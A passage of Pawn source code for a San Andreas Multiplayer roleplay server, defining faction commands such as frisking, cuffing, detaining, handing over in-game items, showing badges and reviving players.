	    return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 2.0,1834.0574,-1311.3999,44.0391) && IsFBI(playerid))
    {
        if(!fbidoorstatus)
        {
	        MoveDynamicObject(fbidoor,1833.328613, -1312.144897, 42.999069, 0.50, 0.000000, 0.000000, 112.299995);
	    	format(string, sizeof(string), "* %s puts their finger on the scanner and opens the door.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        fbidoorstatus = 1;
	    }
	    else
	    {
            MoveDynamicObject(fbidoor,1833.335083, -1312.269897, 43.009098, 0.50,0.000000, 0.000000, 0.000000);
            format(string, sizeof(string), "* %s puts their finger on the scanner and closes the door.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        fbidoorstatus = 0;
	    }
	    return 1;
	}
	else
	{
	    return SendClientMessage(playerid, COLOR_GRAD2, "You are not near a door you can open.");
	}
	return 1;
}
IRP:frisk(playerid, var[])
{
	new user, string[128], weaps, weapons[13][2];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var,"u",user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /frisk [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!IsPlayerNearPlayer(playerid, user, 3)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't frisk someone from that distance.");
	if(!IsPlayerCuffed(user) && !Tied[user] && GetPlayerSpecialAction(user) != SPECIAL_ACTION_HANDSUP) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not cuffed, tied nor has their hands up.");
	format(string, sizeof(string), "*** %s's Items ***", GetName(user));
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " Money ($%d)", Player[user][pMoney]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	if(Player[user][pMaterials]) {format(string, sizeof(string), "* Materials (%d)", Player[user][pMaterials]); SendClientMessage(playerid, COLOR_WHITE, string);}
	if(Player[user][pWeed]) {format(string, sizeof(string), "* Weed (%d)", Player[user][pWeed]); SendClientMessage(playerid, COLOR_WHITE, string);}
	if(Player[user][pCocaine]) {format(string, sizeof(string), "* Cocaine(%d)", Player[user][pCocaine]); SendClientMessage(playerid, COLOR_WHITE, string);}
	if(Player[user][pSeeds]) {format(string, sizeof(string), "* Seeds(%d)", Player[user][pSeeds]); SendClientMessage(playerid, COLOR_WHITE, string);}
	format(string, sizeof(string), "*** %s's Weapons ***", GetName(user));
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	for(new i=0; i<13; i++)
	{
       	GetPlayerWeaponData(user, i, weapons[i][0], weapons[i][1]);
        if(weapons[i][0] != Player[user][pWeapon][i] && weapons[i][1] != 0)
        {
	        format(string, sizeof(string), " %s (Ammo: %d) (Hacked)", RWN(weapons[i][0]), weapons[i][1]);
	        SendClientMessage(playerid, COLOR_WHITE, string);
	        weaps++;
        }
        else if(weapons[i][0] == Player[user][pWeapon][i] && weapons[i][0] != 0)
        {
            format(string, sizeof(string), " %s (Ammo: %d)", RWN(Player[user][pWeapon][i]), weapons[i][1]);
	        SendClientMessage(playerid, COLOR_WHITE, string);
	        weaps++;
        }
	}
	if(weaps == 0) return SendClientMessage(playerid, COLOR_WHITE, "** None");
	format(string, sizeof(string), "* %s has frisked %s.", GetName(playerid), GetName(user));// fix this
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}

IRP:showbadge(playerid, var[])
{
	new user, string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsACop(playerid) && !IsAGov(playerid) && !IsDOC(playerid) && !IsFBI(playerid) && !IsMedic(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO/Government Official/Medic.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(sscanf(var,"u",user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /showbadge [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!IsPlayerNearPlayer(playerid, user, 5)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't flash your badge to someone from that distance.");
	if(IsACop(playerid)) SendClientMessage(user, COLOR_BLUE, "[Los Santos Police Department]");
	else if(IsAGov(playerid)) SendClientMessage(user, COLOR_GOV, "[San Andreas Government]");
	else if(IsFBI(playerid)) SendClientMessage(user, COLOR_FBI, "[Federal Bureau Of Investigation]");
	else if(IsMedic(playerid)) SendClientMessage(user, COLOR_MEDIC, "[Los Santos Fire & Medic Department]");
	else if(IsDOC(playerid)) SendClientMessage(user, COLOR_DOC, "[Department Of Correction]");
	format(string, sizeof(string), " Name: %s", GetName(playerid));
	SendClientMessage(user, COLOR_WHITE, string);
	format(string, sizeof(string), " Rank: %s", RPFRN(playerid));
	SendClientMessage(user, COLOR_WHITE, string);
	format(string, sizeof(string), "* %s flashes their badge to %s.", GetName(playerid), GetName(user));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}
IRP:give(playerid, var[])
{
	new string[256], user, amount = Player[playerid][pWeed] && Player[playerid][pCocaine] && Player[playerid][pMaterials];
	if(sscanf(var, "us[32]d", user, var, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /give [playerid] [type] [amount]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [TYPES]: Weed | Cocaine | Seed | Lowmaterial | Medmaterial | Highmaterial");
		return 1;
	}
	if(Player[playerid][pDead]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not allowed to do this while you are injured.");
	if(!IsPlayerNearPlayer(playerid, user, 5)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't give anything to someone from this disatance.");
	if(!Logged(user)) return NoLoginB(playerid);
	if(IsPlayerCuffed(playerid) && IsPlayerTied(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
    if(!strcmp(var, "weed", true))
	{
	    if(amount > Player[playerid][pWeed] || amount < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much.");
	    Player[playerid][pWeed] = Player[playerid][pWeed] -amount;
	    Player[user][pWeed] = Player[user][pWeed] +amount;
	    format(string, sizeof(string), "* %s takes out a bag of Weed and hands it to %s.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    format(string, sizeof(string), " You have given %s %d of Weed.", GetName(user), amount);
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    format(string, sizeof(string), " %s has given you %d of Weed.", GetName(playerid), amount);
	    SendClientMessage(user, COLOR_LIGHTBLUE, string);
	}
	if(!strcmp(var, "seed", true))
	{
	    if(amount > Player[playerid][pSeeds] || amount < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much.");
	    Player[playerid][pSeeds] = Player[playerid][pSeeds] -amount;
	    Player[user][pSeeds] = Player[user][pSeeds] +amount;
	    format(string, sizeof(string), "* %s takes out a bag of Seed and hands it to %s.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    format(string, sizeof(string), " You have given %s %d of Seed.", GetName(user), amount);
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    format(string, sizeof(string), " %s has given you %d of Seed.", GetName(playerid), amount);
	    SendClientMessage(user, COLOR_LIGHTBLUE, string);
	}
	if(!strcmp(var, "cocaine", true))
	{
	    //if(GetPlayerDrunkLevel(playerid) >= 5000) return SendClientMessage(playerid, COLOR_GRAD2, "You are too drunk/stoned to use drugs.");
	    if(amount > Player[playerid][pCocaine] || amount < 1) return SendClientMessage(playerid, COLOR_GRAD2, "   You don't have that much.");
	    Player[playerid][pCocaine] = Player[playerid][pCocaine] -amount;
	    Player[user][pCocaine] = Player[user][pCocaine] +amount;
	    format(string, sizeof(string), "* %s takes out a bag of Cocaine and hands it to %s.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    format(string, sizeof(string), " You have given %s %d of Cocaine.", GetName(user), amount);
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    format(string, sizeof(string), " %s has given you %d of Cocaine.", GetName(playerid), amount);
        SendClientMessage(user, COLOR_LIGHTBLUE, string);
	}
	if(!strcmp(var, "lowmaterial", true))
	{
	    if(amount > Player[playerid][pLMaterials] || amount < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much.");
	    Player[playerid][pLMaterials] = Player[playerid][pLMaterials] -amount;
	    Player[user][pLMaterials] = Player[user][pLMaterials] +amount;
	    format(string, sizeof(string), "* %s takes out a bag of Low-Materials and hands it to %s.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    format(string, sizeof(string), " You have given %s %d of Low-Materials.", GetName(user), amount);
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    format(string, sizeof(string), " %s has given you %d of Low-Materials.", GetName(playerid), amount);
        SendClientMessage(user, COLOR_LIGHTBLUE, string);
	}
	if(!strcmp(var, "medmaterial", true))
	{
	    if(amount > Player[playerid][pMMaterials] || amount < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much.");
	    Player[playerid][pMMaterials] = Player[playerid][pMMaterials] -amount;
	    Player[user][pMMaterials] = Player[user][pMMaterials] +amount;
	    format(string, sizeof(string), "* %s takes out a bag of Medium-Materials and hands it to %s.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    format(string, sizeof(string), " You have given %s %d of Medium-Materials.", GetName(user), amount);
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    format(string, sizeof(string), " %s has given you %d of Medium-Materials.", GetName(playerid), amount);
        SendClientMessage(user, COLOR_LIGHTBLUE, string);
	}
	if(!strcmp(var, "highmaterial", true))
	{
	    if(amount > Player[playerid][pHMaterials] || amount < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much.");
	    Player[playerid][pHMaterials] = Player[playerid][pHMaterials] -amount;
	    Player[user][pHMaterials] = Player[user][pHMaterials] +amount;
	    format(string, sizeof(string), "* %s takes out a bag of High-Materials and hands it to %s.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    format(string, sizeof(string), " You have given %s %d of High-Materials.", GetName(user), amount);
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    format(string, sizeof(string), " %s has given you %d of High-Materials.", GetName(playerid), amount);
        SendClientMessage(user, COLOR_LIGHTBLUE, string);
	}
	return 1;
}
IRP:take(playerid, var[])
{
	new string[256], user;
	if(sscanf(var, "us[32]d", user, var))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /take [playerid] [type]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [TYPES]: Weed | Cocaine | Weed| Cellphone | CarLicense | FlyingLicense | WeaponLicense | Materials | Weapons | Seeds ");
		return 1;
	}
	if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't take anything from someone from this disatance.");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!IsACop(playerid) && !IsFBI(playerid) && !IsDOC(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not on duty.");
    if(!strcmp(var, "Weed", true))
	{
	    Player[user][pWeed] = 0;
	    format(string, sizeof(string), "* %s has taken all %s Weed.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	if(!strcmp(var, "Weed", true))
	{
	    Player[user][pWeed] = 0;
	    format(string, sizeof(string), "* %s has taken all %s Weed.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	if(!strcmp(var, "Seeds", true))
	{
	    Player[user][pSeeds] = 0;
	    format(string, sizeof(string), "* %s has taken all %s Seeds.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	if(!strcmp(var, "cocaine", true))
	{
	    Player[user][pCocaine] = 0;
	    format(string, sizeof(string), "* %s has taken all %s Cocaine.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
    if(!strcmp(var, "cellphone", true))
	{
	    Player[user][pPhone] = 0;
	    Player[user][pHasCellphone] = 0;
	    format(string, sizeof(string), "* %s has taken %s's cellphone.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	if(!strcmp(var, "carlicense", true))
	{
	    Player[user][pCarLic] = 0;
	    format(string, sizeof(string), "* %s has taken %s's driver license.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	if(!strcmp(var, "flyinglicense", true))
	{
	    Player[user][pFlyLic] = 0;
	    format(string, sizeof(string), "* %s has taken %s's flying license.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	if(!strcmp(var, "weaponlicense", true))
	{
	    Player[user][pGunLic] = 0;
	    format(string, sizeof(string), "* %s has taken %s's weapon license.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	if(!strcmp(var, "materials", true))
	{
	    Player[user][pLMaterials] = 0;
	    Player[user][pMMaterials] = 0;
	    Player[user][pHMaterials] = 0;
	    format(string, sizeof(string), "* %s has taken %s's materials.", GetName(playerid), GetName(user));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	if(!strcmp(var, "weapons", true))
	{
            ResetZamoraWeapons(user);
		    format(string, sizeof(string), "* %s has taken %s's weapons.", GetName(playerid), GetName(user));
	        SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	return 1;
}
IRP:locker(playerid, var[])
{
    if(!Logged(playerid)) return NoLogin(playerid);
	if(IsACop(playerid))
	{
		if(!IsPlayerInRangeOfPoint(playerid, 5.0, 255.3484,76.8337,1003.6406)) return SendClientMessage(playerid, COLOR_GRAD2, "You aren't near your locker.");
	    ShowDialog(playerid, 5);
	}
	if(IsMedic(playerid))
	{
		if(!IsPlayerInRangeOfPoint(playerid, 2.2,-196.3490,-1748.9015,675.7687)) return SendClientMessage(playerid, COLOR_GRAD2, "You aren't near your locker.");
	    ShowDialog(playerid, 47);
	}
	if(IsFBI(playerid))
	{
		if(!IsPlayerInRangeOfPoint(playerid, 2.2,1811.1182,-1311.2119,44.0391)) return SendClientMessage(playerid, COLOR_GRAD2, "You aren't near your locker.");
	    ShowDialog(playerid, 53);
	}
	if(IsDOC(playerid))
	{
		if(!IsPlayerInRangeOfPoint(playerid, 2.2,-2043.4755,-187.9902,985.1878)) return SendClientMessage(playerid, COLOR_GRAD2, "You aren't near your locker.");
	    ShowDialog(playerid, 55);
	}
	return 1;
}

IRP:gov(playerid, var[])
{
	new string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsACop(playerid) && !IsAGov(playerid) && !IsDOC(playerid) && !IsFBI(playerid) && !IsMedic(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO/Government/Medic");
	if(!Player[playerid][pFacLeader]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a faction leader.");
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/gov)ernment announcement [text]");
	if(AntiAdv(playerid, var)) return 1;
	format(string, sizeof(string), "|___________ Government Announcement ___________|");
	SendClientMessageToAll(COLOR_GOV, string);
	format(string, sizeof(string), "** %s %s: %s **", RPFRN(playerid), GetName(playerid), var);
	SendClientMessageToAll(COLOR_WHITE, string);
	return 1;
}
IRP:revivept(playerid, var[])
{
	new string[128], user;
    if(!Logged(playerid)) return NoLogin(playerid);
    if(!IsMedic(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Medic.");
   	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /revivept [playerid]");
   	if(user == playerid) { SendClientMessage(playerid, COLOR_GRAD2, "You cannot revive yourself"); return 1; }
   	if(!Logged(user)) return NoLoginB(playerid);
   	if(!Player[user][pDead]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not injured.");
   	Player[user][pDead] = 0;
   	TogglePlayerControllable(user, 1);
   	StopLoopingAnim(user);
   	SetPlayerHealth(user, 100);
   	SetCameraBehindPlayer(user);
   	format(string, sizeof(string), "* You have been revived by %s .", GetName(playerid));
	SendClientMessage(user, COLOR_MEDIC, string);
	format(string, sizeof(string), "* You have revived %s .", GetName(user));
	SendClientMessage(user, COLOR_MEDIC, string);
	format(string, sizeof(string), "* %s carries %s and puts him on a stretcher, then reserves him in their car.", GetName(playerid), GetName(user));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}
IRP:healpt(playerid, var[])
{
	new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(!IsMedic(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Medic.");
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /healpt [playerid]");
	if(user == playerid) { SendClientMessage(playerid, COLOR_GRAD2, "You cannot heal yourself"); return 1; }
    SetPlayerHealth(user, 100);
    format(string, sizeof(string), "* You've been healed by %s", GetName(playerid));
   	SendClientMessage(user, COLOR_WHITE, string);
   	format(string, sizeof(string), "* %s has given %s a medicine to drink.", GetName(playerid), GetName(user));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    return 1;
}
IRP:movept(playerid, var[])
{
	if(!IsMedic(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Medic.");
	if(IsPlayerInAnyVehicle(playerid))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You can't do this while you're in a vehicle.");
		return 1;
	}
	new string[256], user, seat;
	if(sscanf(var, "ud", user, seat)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /movept [playerid] [seatid 1-3]");
	if(Logged(user))
	{
		if(seat < 1 || seat > 3)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "The seat ID cannot be above 3 or below 1.");
			return 1;
		}
		if(IsPlayerInAnyVehicle(user))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "That person is in a car - get them out first.");
			return 1;
		}
		if(!IsPlayerNearPlayer(playerid, user, 2))
		if(user == playerid) { SendClientMessage(playerid, COLOR_GRAD2, "You cannot carry yourself on a stretcher"); return 1; }
		if(!Player[user][pDead]) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use the stretcher to carry uninjured people.");
		new carid = LastCar[playerid];
		if(IsSeatAvailable(carid, seat))
		{
		    new Float:pos[6];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			GetPlayerPos(user, pos[3], pos[4], pos[5]);
			GetVehiclePos( carid, pos[0], pos[1], pos[2]);
			if (floatcmp(floatabs(floatsub(pos[0], pos[3])), 10.0) != -1 &&
		  	floatcmp(floatabs(floatsub(pos[1], pos[4])), 10.0) != -1 &&
			floatcmp(floatabs(floatsub(pos[2], pos[5])), 10.0) != -1) return false;
			format(string, sizeof(string), "* You were carried on a stretcher by %s, and reserve in their car.", GetName(playerid));
			SendClientMessage(user, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* You detained %s .", GetName(user));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* %s carries %s and puts him on a stretcher, then reserves him in their car.", GetName(playerid), GetName(user));
           	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    ClearAnimations(user);
			TogglePlayerControllable(user, false);
			PutPlayerInVehicle(user, carid, seat);
		}
		else
		{
		   	SendClientMessage(playerid, COLOR_GRAD2, "That seat isn't available!");
		    return 1;
		}
	}
	else
	{
		NoLoginB(playerid);
		return 1;
    }
	return 1;
}
IRP:mdc(playerid, var[])
{
    if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
    if(IsMDCPermitted(playerid))
	{
        if(IsPlayerInAnyVehicle(playerid))
		{
            ShowPlayerDialog(playerid, MDC_MAIN, DIALOG_STYLE_LIST, "SA-MDC - Logged in", "*Find LEO\n*Backup Request\n*Find Civilian\n*Civilian Options", "OK", "Cancel");
            ConnectedToPC[playerid] = 1337;
        }
        else SendClientMessage(playerid, COLOR_GRAD2, "You're not in a vehicle.");
    }
    return 1;
}
IRP:bkcancel(playerid, var[])
{
    if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
    foreach(Player, i)
	{
       SetPlayerMarkerForPlayer(playerid, i, 0xFFFFFF00 );
	}
	return 1;
}
IRP:detain(playerid, var[])
{
	if(!IsACop(playerid) && !IsDOC(playerid) && !IsFBI(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(IsPlayerInAnyVehicle(playerid))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You can't do this while you're in a vehicle.");
		return 1;
	}
	new string[256], user, seat;
	if(sscanf(var, "ud", user, seat)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /detain [playerid] [seatid 1-3]");
	if(Logged(user))
	{
		if(seat < 1 || seat > 3)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "The seat ID cannot be above 3 or below 1.");
			return 1;
		}
		if(IsFBI(user) || IsACop(user) || IsDOC(user))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You can't detain other law enforcement officers.");
			return 1;
		}
		if(IsPlayerInAnyVehicle(user))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "That person is in a car - get them out first.");
			return 1;
		}
		if(!IsPlayerNearPlayer(playerid, user, 2))
		if(user == playerid) { SendClientMessage(playerid, COLOR_GRAD2, "You cannot detain yourself!"); return 1; }
		if(!IsPlayerCuffed(user)) return SendClientMessage(playerid, COLOR_GRAD2, "The player is not cuffed.");
		new carid = LastCar[playerid];
		if(IsSeatAvailable(carid, seat))
		{
		    new Float:pos[6];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			GetPlayerPos(user, pos[3], pos[4], pos[5]);
			GetVehiclePos( carid, pos[0], pos[1], pos[2]);
			if (floatcmp(floatabs(floatsub(pos[0], pos[3])), 10.0) != -1 &&
		  	floatcmp(floatabs(floatsub(pos[1], pos[4])), 10.0) != -1 &&
			floatcmp(floatabs(floatsub(pos[2], pos[5])), 10.0) != -1) return false;
			format(string, sizeof(string), "* You were detained by %s .", GetName(playerid));
			SendClientMessage(user, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* You detained %s .", GetName(user));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* %s puts %s from their cuffs and throws him inside the car.", GetName(playerid), GetName(user));
           	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    ClearAnimations(user);
			TogglePlayerControllable(user, false);
			PutPlayerInVehicle(user, carid, seat);
		}
		else
		{
		   	SendClientMessage(playerid, COLOR_GRAD2, "That seat isn't available!");
		    return 1;
		}
	}
	else
	{
		NoLoginB(playerid);
		return 1;
    }
	return 1;
}

IRP:cuff(playerid, var[])
{
	new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsACop(playerid) && !IsDOC(playerid) && !IsFBI(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /cuff [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
    if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	if(!IsPlayerTazed(user) && GetPlayerSpecialAction(user) != SPECIAL_ACTION_HANDSUP) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not tazed nor has their hands up.");
	// /me Message & Animation
	GameTextForPlayer(user, "~r~Cuffed", 3500, 3);
    format(string, sizeof(string), "* %s pulls a pair of silver cuffs from their belt and puts %s's hands inside them.", GetName(playerid), GetName(user));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	ClearAnimations(user);
	//ApplyAnimation(user,"ped","cower",1,1,0,0,0,0,1);
	// Custom Freeze
	TogglePlayerControllable(user, 0);
	//ApplyAnimation(user,"ped","cower",1,1,0,0,0,0,1);
	SetPlayerAttachedObject(user, 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
    SetPlayerSpecialAction(user,SPECIAL_ACTION_CUFFED);
	// Tazed Setting
	TogglePlayerTazed(user, 0);
	TogglePlayerCuffed(user, 1);
	// Cuff Timeout
	CuffTimeout[user] = 300;
	KillTimer(TazeCountDown[user]);
	CuffCountDown[user] = SetTimerEx("CuffTimer", 1000, true, "d", user);
	return 1;
}


IRP:uncuff(playerid, var[])
{
	new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsACop(playerid) && !IsDOC(playerid) && !IsFBI(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO.");
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /uncuff [playerid]");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't uncuff yourself.");
	if(!Logged(user)) return NoLoginB(playerid);
    if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	if(!IsPlayerCuffed(user)) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not cuffed");
	if(IsPlayerTied(user)) return SendClientMessage(playerid, COLOR_GRAD2, "That player is tied.");
	CuffTimeout[user] = 0;
	format(string, sizeof(string), "* %s reaches %s and uncuffs them.", GetName(playerid), GetName(user));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	TogglePlayerTazed(user, 0);
	TogglePlayerCuffed(user, 0);
	Uncuffed[user] = 1;
	KillTimer(CuffCountDown[playerid]);
	RemovePlayerAttachedObject(user, 0);
	SetPlayerSpecialAction(user, SPECIAL_ACTION_NONE);
	TogglePlayerControllable(user, 1);
	return 1;
}

IRP:tazer(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pDead]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not allowed to do this while you are injured.");
   	if(Event[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You cant do that while you are in event.");
   	if(Paintball[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You cant do that while you are in paintball.");
	if(IsPlayerCuffed(playerid) && IsPlayerTied(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	if(!IsACop(playerid) && !IsFBI(playerid) && !IsDOC(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
